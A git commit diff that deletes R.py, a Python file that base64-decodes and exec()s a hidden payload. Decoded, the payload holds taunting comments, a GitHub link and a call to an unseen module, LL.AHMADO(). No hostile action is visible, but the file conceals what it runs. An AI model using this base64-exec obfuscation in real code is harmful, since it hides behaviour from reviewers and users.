7c0871e766740939e936e4d094d5f8d4776962ee
Rani <109195584+ranisharma09@users.noreply.github.com>
2022-10-02 12:56:10 +0530

    Delete R.py

--- R.py
+++
@@ -1,2 +0,0 @@
-import base64
-exec(base64.b64decode("I2t5YSBkZWtoTmUgYWF5ZSBobyDwn5iG8J+Yhg0KI2FhdmkgYWF5ZSBob3RvIGZvbGxvdyB2aSBrciBMbyANCiNnaXRodWIgaHR0cHM6Ly9naXRodWIuY29tL3JhbmlzaGFybWEwOQ0KDQppbXBvcnQgTEwNCg0KTEwuQUhNQURPKCk="))
